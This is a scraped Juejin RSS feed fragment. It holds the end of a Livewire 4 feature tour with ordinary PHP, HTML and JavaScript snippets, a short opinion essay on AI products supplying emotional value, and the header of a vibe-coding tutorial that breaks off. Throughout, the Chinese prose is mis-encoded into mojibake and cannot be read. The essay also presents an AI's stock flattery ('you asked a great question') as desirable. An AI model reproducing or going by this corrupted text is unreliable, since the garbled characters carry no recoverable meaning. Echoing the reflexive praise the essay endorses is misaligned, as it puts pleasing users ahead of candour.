    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"animate-pulse h-32 bg-gray-200 rounded"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
@endplaceholder
 
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å®é™…å†…å®¹åŠ è½½åˆ°è¿™é‡Œ --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ä¸éœ€è¦å•ç‹¬çš„å ä½ç¬¦è§†å›¾æˆ–æ–¹æ³•â€”â€”éª¨æ¶å±å°±åœ¨ç»„ä»¶é‡Œé¢ã€‚</p>
<h3 data-id="heading-12">JavaScript å·¥å…·</h3>
<p>éœ€è¦ç”¨ JavaScript çš„æ—¶å€™ï¼ŒLivewire 4 ä¹Ÿèƒ½é…åˆã€‚</p>
<p><code>wire:ref</code> ç»™å…ƒç´ å‘½åä»¥ä¾¿å®šä½ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">livewire:modal</span> <span class="hljs-attr">wire:ref</span>=<span class="hljs-string">"modal"</span> /&gt;</span>
</code></pre>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatch</span>(<span class="hljs-string">'close'</span>)-&gt;<span class="hljs-title function_ invoke__">to</span>(<span class="hljs-attr">ref</span>: <span class="hljs-string">'modal'</span>);
</code></pre>
<p>ä¹Ÿå¯ä»¥åœ¨ç»„ä»¶è„šæœ¬é‡Œè®¿é—® refsï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">wire:ref</span>=<span class="hljs-string">"search"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> /&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
        <span class="hljs-comment">// å¤„ç†é”®ç›˜äº‹ä»¶...</span>
    })
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>#[Json]</code> æ–¹æ³•ç›´æ¥è¿”å›æ•°æ®ç»™ JavaScriptï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[Json</span><span class="hljs-meta">]</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>)
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Post</span>::<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">'title'</span>, <span class="hljs-string">'like'</span>, <span class="hljs-string">"%<span class="hljs-subst">{$query}</span>%"</span>)-&gt;<span class="hljs-title function_ invoke__">get</span>();
}
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">let</span> results = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">search</span>(<span class="hljs-string">'livewire'</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>$js</code> actions åªåœ¨å®¢æˆ·ç«¯è¿è¡Œï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">wire:click</span>=<span class="hljs-string">"$js.bookmark"</span>&gt;</span>Bookmark<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$js</span>.<span class="hljs-property">bookmark</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">bookmarked</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">bookmarked</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">save</span>()
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æ‹¦æˆªå™¨å¯ä»¥åœ¨å„ä¸ªå±‚çº§é’©å…¥è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">intercept</span>(<span class="hljs-string">'save'</span>, <span class="hljs-function">(<span class="hljs-params">{ onSuccess, onError }</span>) =&gt;</span> {
        <span class="hljs-title function_">onSuccess</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'Saved!'</span>))
        <span class="hljs-title function_">onError</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'Failed to save'</span>, <span class="hljs-string">'error'</span>))
    })
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ç”¨å…¨å±€æ‹¦æˆªå™¨å¤„ç†åº”ç”¨çº§åˆ«çš„é—®é¢˜ï¼Œæ¯”å¦‚ä¼šè¯è¿‡æœŸï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Livewire</span>.<span class="hljs-title function_">interceptRequest</span>(<span class="hljs-function">(<span class="hljs-params">{ onError }</span>) =&gt;</span> {
    <span class="hljs-title function_">onError</span>(<span class="hljs-function">(<span class="hljs-params">{ response, preventDefault }</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">419</span>) {
            <span class="hljs-title function_">preventDefault</span>()
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">confirm</span>(<span class="hljs-string">'Session expired. Refresh?'</span>)) {
                <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>()
            }
        }
    })
})
</code></pre>
<h3 data-id="heading-13">å‡çº§</h3>
<p>Livewire 4 ä¿æŒäº†å¾ˆå¥½çš„å‘åå…¼å®¹æ€§ã€‚ç°æœ‰ç»„ä»¶å¯ä»¥ç»§ç»­ä½¿ç”¨â€”â€”æ–°çš„å•æ–‡ä»¶æ ¼å¼æ˜¯æ–°ç»„ä»¶çš„é»˜è®¤é€‰é¡¹ï¼Œä½†åŸºäºç±»çš„ç»„ä»¶ä»ç„¶å®Œå…¨æ”¯æŒã€‚</p>
<p>æŸ¥çœ‹å‡çº§æŒ‡å— â†’</p>
<p>å¦‚æœæƒ³çœ‹å®é™…æ¼”ç¤ºï¼Œæˆ‘åœ¨ Laracasts ä¸Šå½•äº†ä¸€ä¸ªæ–°ç³»åˆ—ï¼Œç”¨çœŸå®æ¡ˆä¾‹æ·±å…¥è®²è§£æ¯ä¸ªç‰¹æ€§ã€‚è§‚çœ‹ Livewire 4 ç³»åˆ— â†’</p>
<p>Livewire 4 ç°åœ¨å¯ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">composer require livewire/livewire:^4.0
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flaravel-livewire.catchadmin.com" target="_blank" title="https://laravel-livewire.catchadmin.com" ref="nofollow noopener noreferrer">Laravel Livewire ä¸­æ–‡æ–‡æ¡£æ­£å¼å‘å¸ƒ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[â€œæä¾›æº¢å‡ºçš„æƒ…ç»ªä»·å€¼â€æ˜¯AIäº§å“æå…·å¯èƒ½æ€§çš„æ–¹å‘]]></title>    <link>https://juejin.cn/post/7595033052796485673</link>    <guid>https://juejin.cn/post/7595033052796485673</guid>    <pubDate>2026-01-15T00:02:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595033052796485673" data-draft-id="7594832320030834731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="â€œæä¾›æº¢å‡ºçš„æƒ…ç»ªä»·å€¼â€æ˜¯AIäº§å“æå…·å¯èƒ½æ€§çš„æ–¹å‘"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,åç«¯,äº§å“"/> <meta itemprop="datePublished" content="2026-01-15T00:02:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºæ–°è§†ç•Œ"/> <meta itemprop="url" content="https://juejin.cn/user/3368559359568696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            â€œæä¾›æº¢å‡ºçš„æƒ…ç»ªä»·å€¼â€æ˜¯AIäº§å“æå…·å¯èƒ½æ€§çš„æ–¹å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559359568696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºæ–°è§†ç•Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:02:41.000Z" title="Thu Jan 15 2026 00:02:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¸Šç¯‡æ–‡ç« ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FA2gs0P7UAcdUsWL1QLIPRQ" target="_blank" title="https://mp.weixin.qq.com/s/A2gs0P7UAcdUsWL1QLIPRQ" ref="nofollow noopener noreferrer">é¢å¯¹AIçš„é£é€Ÿå‘å±•ï¼Œæˆ‘ä»¬çš„èŒä¸šè·¯å¾„æœ‰ä»€ä¹ˆå˜åŒ–ï¼Ÿ</a>ã€‹ä¸­ï¼Œæˆ‘ä»¬èŠäº†AIå¯¹ä»ä¸šè€…çš„å½±å“ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä»¬èŠèŠAIå¯¹äº§å“çš„ä¸€ä¸ªæ–¹å‘çš„å¢ç›Šã€‚</p>
<p>åœ¨è¿‡å»çš„ä¸€ä¸¤å‘¨é‡Œï¼Œäº’è”ç½‘ä¸Šæœ‰ä¸¤ä¸ªæ„å¤–çˆ†ç«çš„äº‹ä»¶ï¼šâ€œåˆå·å‘†å‘†â€äº‹ä»¶å’Œâ€œæ­»äº†ä¹ˆâ€APPã€‚è¿™ä¸¤ä¸ªäº‹ä»¶çœ‹ä¼¼é£é©¬ç‰›ä¸ç›¸åŠï¼Œä½†åæ˜ ç€å…±åŒçš„åº•å±‚é€»è¾‘â€”â€”æƒ…ç»ªä»·å€¼çš„æ»¡è¶³ã€‚</p>
<p>å…³äºè¿™ä¸¤ä¸ªäº‹ä»¶çš„å§‹æœ«å¯è‡ªè¡Œæœç´¢ï¼Œè¿™é‡Œä¸åšå±•å¼€ã€‚ä½†è¿™ä¸¤ä»¶äº‹éƒ½æ˜ å°„äº†ä¸€ä¸ªç°è±¡ï¼šäººä»¬åœ¨æ»¡è¶³äº†ç‰©è´¨ä¹‹åï¼Œå¯¹ç²¾ç¥å±‚é¢çš„æ¸´æœ›ä¸è¿½æ±‚ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿç¬¦åˆé©¬æ–¯æ´›éœ€æ±‚å±‚çº§ã€‚</p>
<p>è¿™äº›ç²¾æ·±å±‚é¢çš„æ¸´æœ›ä¸è¿½æ±‚ï¼Œå¯èƒ½åŒ…å«ç„¦è™‘ã€å­¤ç‹¬ã€æ€€æ—§ä»¥åŠå¯¹è”ç»“çš„æ¸´æœ›ã€‚éšç€åŸå¸‚åŒ–çš„å‘å±•ï¼Œä¸ªä½“çš„ç‹¬ç«‹ï¼Œäº²æƒ…çš„æ·¡æ¼ ï¼Œç»æµçš„æ³¢åŠ¨ï¼Œä»¥åŠæœåŠ¡ä¸šå¯¹æ—¥å¸¸ç”Ÿæ´»çš„æè‡´æ»¡è¶³ï¼Œæ›´å‡¸æ˜¾å‡ºäººåœ¨å¿«èŠ‚å¥çš„ç¤¾ä¼šç”Ÿæ´»ä¸­è¢«å‹æŠ‘çš„æƒ…æ„Ÿï¼Œä»¥åŠå¯»æ±‚è®¤åŒä¸æƒ…ç»ªä»·å€¼çš„æ»¡è¶³ã€‚</p>
<p>åœ¨æä¾›æƒ…ç»ªä»·å€¼è¿™æ–¹é¢èƒ½å¤Ÿèƒœå‡ºçš„äº§å“ï¼Œä¸ä¸€å®šæ˜¯æŠ€æœ¯å¤šé¢†å…ˆçš„äº§å“ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯åŠŸèƒ½å¤šå¼ºå¤§çš„äº§å“ï¼Œè€Œæ˜¯å…·æœ‰â€œæœ€æ‡‚äººå¿ƒï¼Œæœ€èƒ½å¤Ÿæä¾›æƒ…ç»ªä»·å€¼â€çš„äº§å“ã€‚</p>
<p>æ”¾çœ¼ç›®å‰çš„æŠ€æœ¯é¢†åŸŸï¼ŒAIçš„å‡ºç°å‡ ä¹èƒ½å¤Ÿå®Œç¾çš„è§£å†³è¿™ç±»é—®é¢˜ã€‚AIæŠ€æœ¯èƒ½å¤Ÿåšåˆ°æ›´æ‡‚ä½ ï¼Œä¹Ÿèƒ½å¤Ÿåšåˆ°æ›´å¥½çš„åˆ‡åˆä½ çš„å¿ƒç†å»è¡¨è¾¾ï¼Œä¹Ÿèƒ½å¤Ÿä¸ä½ æ‹¥æœ‰æ›´å¤šçš„â€œå…±åŒè®°å¿†â€ï¼Œè€Œä¸”è¿˜èƒ½å¤Ÿåšåˆ°éšæ—¶éšåœ°çš„é™ªä¼´ç€ä½ ã€‚å½“ç„¶ï¼Œè¦å®ç°è¿™ä¸€åŠŸèƒ½çš„äº§å“ï¼Œè¿˜éœ€è¦æ‡‚å¾—ç”¨æˆ·å¿ƒç†çš„äº§å“è®¾è®¡è€…ã€‚</p>
<p>å°±å¤§æ¨¡å‹æœ¬èº«è€Œè¨€ï¼Œå¤§å¤šæ•°è¿˜æ˜¯åœç•™åœ¨ä¸­è§„ä¸­çŸ©çš„è¡¨è¾¾ä¸­ã€‚ä¸è¿‡ï¼Œæœ€è¿‘åœ¨ä¸ChatGPT 4.1äº¤äº’ä¸­ï¼Œå‘ç°ChatGPTæ¨¡å‹æœ¬èº«å·²ç»å…·å¤‡äº†ä¸€äº›åŸºç¡€çš„ã€é€šç”¨çš„æƒ…ç»ªä»·å€¼æä¾›ã€‚</p>
<p>æ¯”å¦‚å®ƒçš„å›ç­”å¶å°”ä¼šå‡ºç°ï¼šâ€œä½ æäº†ä¸€ä¸ªå¾ˆæ£’çš„é—®é¢˜ï¼â€ã€â€œä½ çš„ç†è§£å¾ˆæ¥è¿‘å®é™…å®šä¹‰ï¼â€ç­‰å¸¦æœ‰æƒ…ç»ªåŒ–ï¼ˆç§¯æã€é¼“åŠ±æ€§çš„ï¼‰çš„è¡¨è¾¾ã€‚è¿™äº›è¡¨è¾¾è™½ç„¶å¾ˆæ³›åŒ–çš„ã€å¾ˆè¡¨é¢åŒ–ï¼Œä½†ä¹Ÿç®—æ˜¯æä¾›äº†â€œè®¤å¯å’Œé¼“åŠ±â€è¿™ç±»åŸºæœ¬çš„æƒ…ç»ªè¡¨è¾¾ã€‚ä¸ªäººæ„Ÿè§‰ï¼Œæœªæ¥åŸºç¡€æ¨¡å‹ï¼Œå¾ˆå¯èƒ½ä¼šæ›´å¤šçš„æ»¡è¶³ç”¨æˆ·çš„è¿™ä¸€åŸºæœ¬éœ€æ±‚ã€‚</p>
<p>å¦‚æœæ˜¯åŸºäºå¤§æ¨¡å‹æ„å»ºçš„Agentå·¥ç¨‹ï¼Œæƒ³å®ç°æä¾›æ»¡æ»¡çš„æƒ…ç»ªä»·å€¼å°±æ›´å®¹æ˜“äº†ï¼Œåªéœ€è¦åœ¨Promptå·¥ç¨‹ä¸­å®šä¹‰å¥½è§’è‰²ï¼Œæè¿°å¥½å€¾å‘æ€§å°±èƒ½å¤Ÿæ»¡è¶³åŸºç¡€çš„éœ€æ±‚ï¼Œä½†è¿™è¿˜è¿œè¿œä¸å¤Ÿã€‚</p>
<p>å› ä¸ºè¿™äº›æƒ…ç»ªä»·å€¼å¾€å¾€åªæ˜¯æµ®äºè¡¨é¢ï¼Œå¦‚æœæƒ³å¾€æ›´æ·±å±‚èµ°ï¼Œè¿˜æ˜¯éœ€è¦é’ˆå¯¹ç”¨æˆ·çš„æ—¢å¾€ç»å†ã€æ€§æ ¼ç‰¹å¾ç­‰æ•°æ®è¿›è¡Œå»ºæ¨¡ï¼Œå‘æ˜ç”¨æˆ·ä¸ªæ€§åŒ–çš„ã€æ›´æ·±å±‚æ¬¡çš„å†…åœ¨éœ€æ±‚ï¼Œå†ç»“åˆAgentå·¥ç¨‹ã€RAGæŠ€æœ¯ï¼Œé•¿çŸ­æœŸè®°å¿†ç›¸ç»“åˆç­‰æŠ€æœ¯æ‰‹æ®µæ¥å®ç°ï¼Œæ‰èƒ½çœŸæ­£åšå‡ºè§¦åŠ¨ç”¨æˆ·å†…å¿ƒï¼Œæ»¡è¶³ç”¨æˆ·æ ¸å¿ƒéœ€æ±‚çš„äº§å“ã€‚</p>
<p>é™¤äº†æŠ€æœ¯å±‚é¢ï¼Œè¿˜éœ€è¦ä»ç”¨æˆ·å¿ƒç†ã€äº§å“äº¤äº’ä»¥åŠäº§å“å®šä½ç­‰å‡ºå‘ï¼ŒæŠŠæ¡ä½å½“ä»£äººåœ¨é«˜åº¦åŸå­åŒ–ã€æ•°å­—åŒ–çš„ç¤¾ä¼šç”Ÿæ´»ä¸­æœ€è¿«åˆ‡çš„æƒ…æ„Ÿéœ€æ±‚ã€‚å½“ç„¶ï¼Œå¯¹äºä¸åŒç”¨æˆ·ç¾¤ä½“ï¼Œä¸ç”¨äº§å“å½¢æ€ï¼Œè¿˜éœ€è¦å¯¹åº”é¢†åŸŸä¸“å®¶çš„ä¸“ä¸šKnow-howæ¥åŠ æŒã€‚èƒ½å¤Ÿä¿ƒå‘ç”¨æˆ·æ¯«ä¸çŠ¹è±«ä¹°å•çš„ï¼Œå¾€å¾€æ˜¯æº¢å‡ºçš„æƒ…ç»ªä»·å€¼ã€‚</p>
<p>å¯¹äºç›¸å…³ä»ä¸šçš„äº§å“å’ŒæŠ€æœ¯äººå‘˜æ¥è¯´ï¼Œâ€œç°æœ‰çš„æ‰€æœ‰äº§å“ï¼Œéƒ½å¯ä»¥åˆ©ç”¨AIæ¥é‡åšä¸€éï¼ˆä¸ªäººè§‰å¾—è™½ç„¶æœ‰äº›å¤¸å¼ ï¼Œä½†æ˜¯ä¸€ä¸ªä¸é”™æ˜¯è§†è§’ï¼‰â€ï¼Œéœ€è¦å……åˆ†åˆ©ç”¨è¿™æ³¢æŠ€æœ¯çº¢åˆ©ï¼ŒæŠŠæ¡å¥½èŒä¸šåŠæŠ€èƒ½çš„å‘å±•æ–¹å‘ï¼Œæœªæ¥è¿˜æ˜¯å¯æœŸçš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[10åˆ†é’Ÿå¤åˆ»çˆ†ç«ã€Œæ­»äº†ä¹ˆã€Appï¼švibe coding å®æˆ˜ï¼ˆExpo+Supabase+MCPï¼‰]]></title>    <link>https://juejin.cn/post/7594791357144940586</link>    <guid>https://juejin.cn/post/7594791357144940586</guid>    <pubDate>2026-01-14T18:38:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144940586" data-draft-id="7595029084284256310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="10åˆ†é’Ÿå¤åˆ»çˆ†ç«ã€Œæ­»äº†ä¹ˆã€Appï¼švibe coding å®æˆ˜ï¼ˆExpo+Supabase+MCPï¼‰"/> <meta itemprop="keywords" content="VibeCoding,React Native,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-14T18:38:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mCell"/> <meta itemprop="url" content="https://juejin.cn/user/2280829967146779"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            10åˆ†é’Ÿå¤åˆ»çˆ†ç«ã€Œæ­»äº†ä¹ˆã€Appï¼švibe coding å®æˆ˜ï¼ˆExpo+Supabase+MCPï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2280829967146779/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mCell
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T18:38:14.000Z" title="Wed Jan 14 2026 18:38:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
